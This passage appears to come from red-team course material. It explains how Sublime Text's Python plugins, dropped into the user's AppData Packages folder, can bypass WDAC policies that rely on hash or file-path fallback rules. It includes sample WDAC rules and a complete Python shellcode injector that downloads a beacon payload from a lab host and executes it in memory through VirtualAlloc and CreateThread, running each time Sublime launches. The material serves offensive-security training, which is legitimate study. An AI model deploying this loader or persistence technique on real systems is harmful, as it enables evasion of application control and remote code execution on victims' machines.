Like LOLBIN's, third-party applications that have script or code execution capabilities can be dangerous to trust, depending on how the rules are defined.  Good candidates to look at are applications that support plugins, such as [Visual Studio Code](https://code.visualstudio.com/), [Sublime Text](https://www.sublimetext.com/) and [Notepad++](https://notepad-plus-plus.org/).

For example - Sublime is a popular text editor which comes packaged with a Python interpreter and also supports plugins written in Python.  These can be simply dropped into the user's `%AppData%` directory.  [Gabriel Mathenge](https://twitter.com/_theVIVI) wrote a great [article](https://thevivi.net/blog/pentesting/2022-03-05-plugins-for-persistence/) on how Sublime plugins can be used for persistence, but it can also act as a WDAC bypass as well.

The core components of Sublime are signed by their Code Signing CA, which can be used to build a WDAC policy.  However, the unsigned DLLs will not be permitted to load, which will break some of Sublime's functionality (e.g. no Python plugin would be able to function).

```powershell
PS C:\Users\hdoyle> ls 'C:\Program Files\Sublime Text\' -Include *.exe, *.dll -Recurse | Get-AuthenticodeSignature

SignerCertificate                         Status                                     Path
-----------------                         ------                                     ----
834F29A60152CE36EB54AF37CA5F8EC029ECCF01  Valid                                      crash_reporter.exe
                                          NotSigned                                  libcrypto-1_1-x64.dll
                                          NotSigned                                  libssl-1_1-x64.dll
9617094A1CFB59AE7C1F7DFDB6739E4E7C40508F  Valid                                      msvcr100.dll
834F29A60152CE36EB54AF37CA5F8EC029ECCF01  Valid                                      plugin_host-3.3.exe
834F29A60152CE36EB54AF37CA5F8EC029ECCF01  Valid                                      plugin_host-3.8.exe
                                          NotSigned                                  python33.dll
                                          NotSigned                                  python38.dll
834F29A60152CE36EB54AF37CA5F8EC029ECCF01  Valid                                      subl.exe
834F29A60152CE36EB54AF37CA5F8EC029ECCF01  Valid                                      sublime_text.exe
28173C6A166FB89E4A17C4D58CD83B46BDC226BB  UnknownError                               unins000.exe
834F29A60152CE36EB54AF37CA5F8EC029ECCF01  Valid                                      update_installer.exe
62009AAABDAE749FD47D19150958329BF6FF4B34  Valid                                      vcruntime140.dll
```

  

It's therefore common for organisations to use "fallback" policies to allow these to run as well.  The primary trust level is often **Publisher**, and the fallback commonly **Hash** or **FilePath**.

A **Publisher** rule for Sublime could look like this:

```xml
<Signer ID="ID_SIGNER_S_1" Name="Sectigo RSA Code Signing CA">
  <CertRoot Type="TBS" Value="20ADC5B59CB532E215F01BA09A9C745898C206555613512FEA7C295CCFD17CED4FE2C5BC3274CA8A270FC68799B8343C" />
  <CertPublisher Value="Sublime HQ Pty Ltd" />
</Signer>
```

Fallback **Hash** rules for `python38.dll` like this:

```xml
  <FileRules>
    <Allow ID="ID_ALLOW_A_D" FriendlyName="C:\Program Files\Sublime Text\python38.dll Hash Sha1" Hash="07F2BD05F877852F5AA016487CB0B23D7F0F0947" />
    <Allow ID="ID_ALLOW_A_E" FriendlyName="C:\Program Files\Sublime Text\python38.dll Hash Sha256" Hash="FB046BF518AA8C1CCEE19483AE35F41C7A235AF6358FAD3736FF7EFE5C63DE56" />
    <Allow ID="ID_ALLOW_A_F" FriendlyName="C:\Program Files\Sublime Text\python38.dll Hash Page Sha1" Hash="203F80E93E6BFD4BB4046A0FE03332348BCC7241" />
    <Allow ID="ID_ALLOW_A_10" FriendlyName="C:\Program Files\Sublime Text\python38.dll Hash Page Sha256" Hash="024CE702ACD7F513513F68B569C7BD5E8CC47B78401E2186B75D14B56955B96E" />
  </FileRules>
```


And a fallback **FilePath** rule for `python38.dll` like this:

```xml
<FileRules>
  <Allow ID="ID_ALLOW_A_14" FriendlyName="C:\Program Files\Sublime Text\python38.dll FileRule" MinimumFileVersion="0.0.0.0" FilePath="C:\Program Files\Sublime Text\python38.dll" />
</FileRules>
```

It's therefore critical to understand WDAC rules well to find wiggle-room.

Take the following Python code and save it under `%AppData%\Sublime Text\Packages\calc.py`.

```python
import subprocess
subprocess.call('C:\\Windows\\System32\\calc.exe')
```

Now, the calculator will open each time Sublime is launched.  It's that simple.  However, this isn't bypassing WDAC because calc.exe is trusted (signed by Microsoft) - it just demonstrates that the plugin is working.  Instead of calling a binary on disk, we can use a Python shellcode injector such as [this example](https://gist.github.com/peewpw/8054a64eb4b5cd007a8431a71d698dc3) by [Barrett Adams](https://twitter.com/peewpw).

```python
import ctypes
import requests

url = 'http://10.10.5.39/beacon.bin'
r = requests.get(url, stream=True, verify=False)
scbytes = r.content

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ctypes.windll.kernel32.CreateThread.argtypes = (ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int))

mem = ctypes.windll.kernel32.VirtualAlloc(
	ctypes.c_int(0),
	ctypes.c_int(len(scbytes)),
	ctypes.c_int(0x3000),
	ctypes.c_int(0x40)
	)

buf = (ctypes.c_char * len(scbytes)).from_buffer_copy(scbytes)

ctypes.windll.kernel32.RtlMoveMemory(
	ctypes.c_void_p(mem),
	buf,
	ctypes.c_int(len(scbytes))
	)

handle = ctypes.windll.kernel32.CreateThread(
	ctypes.c_int(0),
	ctypes.c_int(0),
	ctypes.c_void_p(mem),
	ctypes.c_int(0),
	ctypes.c_int(0),
	ctypes.pointer(ctypes.c_int(0))
	)
```

  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/wdac/sublime.png)

  

>  This requires the external [requests Python library](https://github.com/bgreenlee/sublime-github/tree/master/lib/requests) to download the shellcode.  To make it available to Sublime, you just have to drop the source files into the same `Packages` directory.  This is already provided on **Workstation 3** for convenience.